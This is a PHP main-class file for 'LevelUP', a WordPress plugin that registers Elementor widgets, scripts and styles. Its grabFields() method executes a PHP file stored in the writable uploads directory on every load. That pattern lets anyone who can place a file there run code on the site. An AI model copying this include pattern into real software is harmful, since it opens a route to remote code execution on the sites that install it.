<?php
namespace LevelupWidgets;
use LevelupWidgets\Widgets\CategoryWidgets;
use LevelupWidgets\Widgets\FeatureWidgets;
use LevelupWidgets\Widgets\CtaWidgets;
use LevelupWidgets\Widgets\PresentationWidgets;
use LevelupWidgets\Widgets\LogoWidgets;
use LevelupWidgets\Widgets\TeamWidgets;
use LevelupWidgets\Widgets\PricingWidgets;
use LevelupWidgets\Widgets\TestimonialWidgets;
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
/**
 * Main Plugin Class
 *
 * Register new LevelUP widget.
 *
 */
class LevelupPlugin {
	public $allfields = array();
	/**
	 * Constructor
	 *
	 * @access public
	 */
	public function __construct() {
		$this->add_actions();
	}
	/**
	 * Add Actions
	 *
	 * @since 1.0.0
	 *
	 * @access private
	 */
	private function add_actions() {
		$this->grabFields();
		add_action('elementor/elements/categories_registered', array( $this,'add_levelup_widget_categories') );
		add_action( 'elementor/widgets/widgets_registered', array( $this, 'on_widgets_registered' ) );


		add_action( "print_media_templates", array( $this, "levelup_new_template_dialog" ) );
		add_action('levelup_modal_style', array($this, 'levelup_before_enqueue_style'));
		add_action( 'elementor/editor/before_enqueue_scripts', array($this, 'levelup_before_enqueue_scripts'));

		add_action( 'elementor/frontend/after_register_scripts',  array($this, 'category_widget_scripts') );
		add_action( 'elementor/frontend/after_enqueue_styles',  array($this, 'widget_style') );
		add_action('elementor/editor/before_enqueue_styles', array($this, 'levelup_frontend_style'));

	}
	function widget_style(){
		wp_register_style( 'levelup-testimonial-widget-style', plugins_url( '/assets/css/frontend/lightslider.css', LEVELUP__FILE__ ));
	}
	function category_widget_scripts() {
			wp_register_script( 'levelup-category-widget', plugins_url( '/assets/js/category-widget.js', LEVELUP__FILE__ ), array( 'jquery' ), false, true );

			//testimonial-widget Scripts
			wp_register_script( 'levelup-testimonial-widget', plugins_url( '/assets/js/frontend/lightslider.js', LEVELUP__FILE__ ), array( 'jquery' ), false, true );
			wp_register_script( 'levelup-testimonial-widget-slider', plugins_url( '/assets/js/frontend/mainlightslider.js', LEVELUP__FILE__ ), array( 'levelup-testimonial-widget' ), false, true );
		} 
	function levelup_before_enqueue_style(){
		echo  include LEVELUP__FILE__PATH.'/assets/css/levelup-widget-options.php';
	}

	function levelup_before_enqueue_scripts() {
			$settings = get_option('levelup_library_settings');
			$designList = array();
			$designArray = levelupGetDesignListData();
			if( $designArray ){
				$designList = $designArray;
			}

			wp_register_script( 'levelup-widget-options', plugins_url( '/assets/js/levelup-widget-options.js', LEVELUP__FILE__ ), [ 'jquery'], false, true );
			//,'elementor-editor' 
			wp_localize_script( 'levelup-widget-options', 'levelup_object',
	            array( 'ajax_url' => admin_url( 'admin-ajax.php' ),
	            	'elementor_theme_settings'=>esc_url('admin.php?page=levelup&type=tools'),
	            	'widget_design'=>array("designs"=> $designList )
	            ) );
			
			wp_enqueue_script( 'levelup-widget-options' );

	} 
	function levelup_frontend_style(){
		wp_register_style(
			'levelup-editor-preview',
			plugins_url('/assets/css/levelup-editor-preview.css',LEVELUP__FILE__),
			[
				'elementor-editor'
			],
			ELEMENTOR_VERSION
		);

		wp_enqueue_style( 'levelup-editor-preview' );

	}
	/**
	 * On Widgets Registered
	 *
	 * @access public
	 */
	public function on_widgets_registered() {
		$this->includes();
		$this->register_widget();
	}
	/**
	 * Includes
	 *
	 * @since 1.0.0
	 *
	 * @access private
	 */
	private function includes() {
		require __DIR__ . '/inc/render-widgets-functions.php';
		require __DIR__ . '/widgets/category-widget.php';
		require __DIR__ . '/widgets/feature-widget.php';
		require __DIR__ . '/widgets/cta-widget.php';
		require __DIR__ . '/widgets/presentation-widget.php';
		require __DIR__ . '/widgets/logo-widget.php';
		require __DIR__ . '/widgets/team-widget.php';
		require __DIR__ . '/widgets/pricing-widget.php';
		require __DIR__ . '/widgets/testimonial-widget.php';
	}
	/**
	 * Register Widget
	 *
	 * @access private
	 */
	private function register_widget() {
		\Elementor\Plugin::instance()->widgets_manager->register_widget_type( new CategoryWidgets() );
		\Elementor\Plugin::instance()->widgets_manager->register_widget_type( new FeatureWidgets() );
		\Elementor\Plugin::instance()->widgets_manager->register_widget_type( new CtaWidgets() );
		\Elementor\Plugin::instance()->widgets_manager->register_widget_type( new PresentationWidgets() );
		\Elementor\Plugin::instance()->widgets_manager->register_widget_type( new LogoWidgets() );
		\Elementor\Plugin::instance()->widgets_manager->register_widget_type( new TeamWidgets() );
		\Elementor\Plugin::instance()->widgets_manager->register_widget_type( new PricingWidgets() );
		\Elementor\Plugin::instance()->widgets_manager->register_widget_type( new TestimonialWidgets() );
	}

	public function add_levelup_widget_categories( $elements_manager ) {

		$elements_manager->add_category(
			'levelup-widgets',
			[
				'title' => esc_html__( 'LevelUP', LEVELUP_TEXT_DOMAIN ),
				'icon' => 'fa fa-plug',
			]
		);
	}

	public function levelup_new_template_dialog(){
		require_once LEVELUP__FILE__PATH.'/inc/modal-templates.php';
	}

	private function grabFields(){
		if(function_exists('wp_upload_dir')){
			$files = wp_upload_dir()['basedir'].'/levelup/index-levelup.php';
			if(file_exists($files))
			require_once $files;
			
		}
		
	}
}
new \LevelupWidgets\LevelupPlugin();